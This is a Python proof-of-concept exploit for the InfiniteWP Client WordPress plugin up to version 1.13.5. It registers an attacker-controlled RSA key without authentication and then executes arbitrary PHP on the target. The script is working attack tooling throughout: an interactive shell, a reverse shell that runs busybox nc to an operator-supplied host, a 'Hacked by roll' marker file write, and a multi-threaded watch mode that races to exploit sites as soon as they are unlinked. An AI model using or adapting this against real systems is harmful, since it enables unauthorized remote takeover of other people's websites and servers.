#!/usr/bin/env python3
"""
PoC: InfiniteWP Client <= 1.13.5 — Unauthenticated + RCE
Precondition: iwp_client_activate_key absent from wp_options
"""

import argparse
import base64
import json
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

MSG_ID = "99999"
PREFIX = "_IWP_JSON_PREFIX_"


def generate_rsa_keypair():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return private_key, private_key.public_key()


def save_private_key(private_key, path: str):
    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    save_path = Path(path).resolve()
    save_path.write_bytes(pem)
    print(f"[*] Private key saved → {save_path}")


def load_private_key(path: str):
    load_path = Path(path).resolve()
    if not load_path.exists():
        print(f"[!] Key file not found: {load_path}")
        sys.exit(1)
    private_key = serialization.load_pem_private_key(load_path.read_bytes(), password=None)
    print(f"[*] Private key loaded ← {load_path}")
    return private_key, private_key.public_key()


def sign_sha256(private_key, data: str) -> str:
    sig = private_key.sign(data.encode(), padding.PKCS1v15(), hashes.SHA256())
    return base64.b64encode(sig).decode()


def public_key_pem_b64(public_key) -> str:
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return base64.b64encode(pem).decode()


def build_body(payload: dict) -> str:
    return PREFIX + base64.b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode()


def parse_iwp_response(text: str) -> dict | None:
    import re
    m = re.search(r"<IWPHEADER>(.*?)<ENDIWPHEADER>", text, re.DOTALL)
    payload = m.group(1).strip() if m else text.strip()
    if payload.startswith(PREFIX):
        payload = payload[len(PREFIX):]
    try:
        return json.loads(base64.b64decode(payload).decode())
    except Exception:
        pass
    try:
        return json.loads(text)
    except Exception:
        return None


def send(session, url: str, body: str, label: str,
         quiet: bool = False, timeout: int = 30) -> dict | None:
    try:
        resp = session.post(
            url, data=body.encode(),
            headers={"Content-Type": "text/plain"},
            timeout=timeout, verify=False,
        )
        if not quiet:
            print(f"[>] {label} — HTTP {resp.status_code}")
        result = parse_iwp_response(resp.text)
        if result is None and not quiet:
            print(f"[!] Could not parse response: {resp.text[:300]}")
        return result
    except requests.RequestException as exc:
        if not quiet:
            print(f"[!] Request failed: {exc}")
        return None


def stage_add_site(session, url, admin_user, private_key, public_key,
                   activation_key: str = "", quiet: bool = False,
                   timeout: int = 30) -> bool:
    action = "add_site"
    sig_new = sign_sha256(private_key, action + MSG_ID)
    payload = {
        "iwp_action": action,
        "id": MSG_ID,
        "signature": "",
        "signature_new": sig_new,
        "params": {
            "username": admin_user,
            "activation_key": activation_key,
            "public_key": public_key_pem_b64(public_key),
            "id": MSG_ID,
            "action": action,
            "user_random_key_signing": False,
            "signature_new": sig_new,
        },
    }
    result = send(session, url, build_body(payload), "add_site", quiet=quiet, timeout=timeout)
    if result is None:
        return False
    if "error" in result:
        if not quiet:
            print(f"[!] add_site error: {result.get('error')} ({result.get('error_code','')})")
        return False
    if "success" in result:
        info = result["success"]
        print(f"[+] add_site succeeded — attacker key registered.")
        print(f"    Site  : {info.get('site_url','?')}")
        print(f"    WP    : {info.get('site_title','?')}")
        print(f"    Path  : {info.get('content_path','?')}")
        print(f"    IWP v : {info.get('client_version','?')}")
        return True
    print(f"[+] add_site — assuming success: {str(result)[:200]}")
    return True


def stage_execute_php(session, url, admin_user, private_key, php_code: str) -> str | None:
    action = "execute_php_code"
    sig_new = sign_sha256(private_key, action + MSG_ID)
    payload = {
        "iwp_action": action,
        "id": MSG_ID,
        "signature": "",
        "signature_new": sig_new,
        "params": {"username": admin_user, "code": php_code, "id": MSG_ID},
    }
    print(f"[*] Stage 2 — executing PHP...")
    result = send(session, url, build_body(payload), "execute_php_code")
    if result is None:
        return None
    if "error" in result:
        print(f"[!] execute_php_code error: {result['error']}")
        return None
    return result.get("output", "")


def interactive_shell(session, url, admin_user, private_key):
    print("\n[+] Dropping into pseudo-shell (type 'exit' to quit)\n")
    while True:
        try:
            cmd = input("shell> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if cmd.lower() in ("exit", "quit"):
            break
        if not cmd:
            continue
        output = stage_execute_php(session, url, admin_user, private_key,
                                   f"echo shell_exec({json.dumps(cmd)});")
        if output is not None:
            print(output, end="" if output.endswith("\n") else "\n")


def main():
    parser = argparse.ArgumentParser(
        description="InfiniteWP Client <=1.13.5 Auth-Bypass + RCE PoC"
    )
    parser.add_argument("--url", required=True, metavar="URL")
    parser.add_argument("--username", default="admin", metavar="USER")
    parser.add_argument("--cmd", metavar="CMD",
                        help="Single OS command (omit for interactive shell)")
    parser.add_argument("--reverse-shell", action="store_true")
    parser.add_argument("--lhost", metavar="IP")
    parser.add_argument("--lport", metavar="PORT", type=int, default=4444)
    parser.add_argument("--pwn", action="store_true",
                        help="Write 'Hacked by roll' to /tmp/Hacked by roll")
    parser.add_argument("--proxy", metavar="PROXY", default="http://127.0.0.1:8080")
    parser.add_argument("--no-proxy", action="store_true",
                        help="Disable proxy entirely")
    parser.add_argument("--save-key", metavar="FILE", nargs="?", const="iwp_attacker_key.pem")
    parser.add_argument("--load-key", metavar="FILE")
    parser.add_argument("--skip-add-site", action="store_true")
    parser.add_argument("--activation-key", metavar="SHA1", default="")
    parser.add_argument("--watch", action="store_true",
                        help="Poll until key is absent, then auto-exploit")
    parser.add_argument("--interval", type=float, default=0.0, metavar="SEC")
    parser.add_argument("--threads", type=int, default=10, metavar="N")
    parser.add_argument("--poll-timeout", type=int, default=5, metavar="SEC")
    parser.add_argument("-q", "--quiet", action="store_true",
                        help="Suppress error/retry logs; only print on success")

    args = parser.parse_args()

    if args.reverse_shell and not args.lhost:
        parser.error("--reverse-shell requires --lhost")

    url = args.url.rstrip("/") + "/"
    requests.packages.urllib3.disable_warnings()
    session = requests.Session()
    if args.no_proxy:
        session.proxies = {"http": "", "https": ""}
        session.trust_env = False
    else:
        session.proxies = {"http": args.proxy, "https": args.proxy}

    if args.load_key:
        private_key, public_key = load_private_key(args.load_key)
    else:
        print("[*] Generating ephemeral RSA-2048 key pair...")
        private_key, public_key = generate_rsa_keypair()

    def _run_stage2(s):
        if args.reverse_shell:
            php = f"shell_exec('busybox nc {args.lhost} {args.lport} -e /bin/bash');"
            stage_execute_php(s, url, args.username, private_key, php)
            return "__reverse_shell__"
        elif args.pwn:
            stage_execute_php(s, url, args.username, private_key,
                              "file_put_contents('/tmp/Hacked by roll', 'Hacked by roll');")
            return "__pwn__"
        elif args.cmd:
            return stage_execute_php(s, url, args.username, private_key,
                                     f"echo shell_exec({json.dumps(args.cmd)});")
        else:
            return "__interactive__"

    if args.watch:
        print(f"[*] Watch mode — {args.threads} threads, poll-timeout={args.poll_timeout}s")
        print("    (Remove the site from IWP Admin Panel to trigger)\n")

        stop_evt   = threading.Event()
        success_ts = [None]
        stage2_out = [None]
        total_att  = [0]
        att_lock   = threading.Lock()

        def _poller():
            s = requests.Session()
            s.proxies   = session.proxies
            s.trust_env = session.trust_env
            s.verify    = False
            while not stop_evt.is_set():
                ok = stage_add_site(s, url, args.username, private_key, public_key,
                                    activation_key="", quiet=True, timeout=args.poll_timeout)
                with att_lock:
                    total_att[0] += 1
                if ok and not stop_evt.is_set():
                    success_ts[0] = datetime.now().strftime("%H:%M:%S")
                    stop_evt.set()
                    stage2_out[0] = _run_stage2(s)
                    return
                if args.interval > 0 and not stop_evt.is_set():
                    time.sleep(args.interval)

        threads_list = [threading.Thread(target=_poller, daemon=True)
                        for _ in range(args.threads)]
        for t in threads_list:
            t.start()

        try:
            while not stop_evt.is_set():
                if not args.quiet:
                    with att_lock:
                        a = total_att[0]
                    print(f"  [{datetime.now().strftime('%H:%M:%S')}] "
                          f"{a} attempts across {args.threads} threads...",
                          end="\r", flush=True)
                time.sleep(0.05)
        except KeyboardInterrupt:
            stop_evt.set()
            print("\n[!] Aborted.")
            sys.exit(0)

        for t in threads_list:
            t.join(timeout=2)

        ts = success_ts[0] or datetime.now().strftime("%H:%M:%S")
        print(f"\n[+] [{ts}] Triggered!")
        if args.save_key:
            save_private_key(private_key, args.save_key)

        out = stage2_out[0]
        if out == "__reverse_shell__":
            print(f"[*] Reverse shell sent to {args.lhost}:{args.lport}")
        elif out == "__pwn__":
            print("[+] File written: /tmp/Hacked by roll")
        elif out == "__interactive__":
            interactive_shell(session, url, args.username, private_key)
        elif out is not None:
            print(f"\n[+] Command output:\n{out}")
        print("[*] Done.")
        sys.exit(0)

    # Non-watch: Stage 1
    if args.skip_add_site or args.load_key:
        print("[*] Stage 1 — skipped.")
    else:
        print("[*] Stage 1 — registering attacker key...")
        ok = stage_add_site(session, url, args.username, private_key, public_key,
                            activation_key=args.activation_key, quiet=args.quiet)
        if not ok:
            print("[!] add_site failed. Precondition not met: iwp_client_activate_key is set in DB.")
            sys.exit(1)
        if args.save_key:
            save_private_key(private_key, args.save_key)

    # Stage 2
    out = _run_stage2(session)
    if out == "__reverse_shell__":
        print(f"[*] Reverse shell sent to {args.lhost}:{args.lport}")
    elif out == "__pwn__":
        print("[+] File written: /tmp/Hacked by roll")
    elif out == "__interactive__":
        interactive_shell(session, url, args.username, private_key)
    elif out is not None:
        print(f"\n[+] Command output:\n{out}")

    print("[*] Done.")


if __name__ == "__main__":
    main()
